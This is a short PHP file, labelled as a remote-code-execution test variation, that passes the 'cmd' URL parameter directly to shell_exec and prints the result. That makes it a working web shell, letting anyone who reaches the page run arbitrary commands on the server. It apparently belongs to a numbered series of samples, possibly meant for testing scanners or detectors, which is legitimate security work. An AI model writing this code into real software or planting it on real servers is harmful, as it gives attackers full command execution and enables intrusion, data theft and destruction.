<?php
// RCE test variation #1292
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>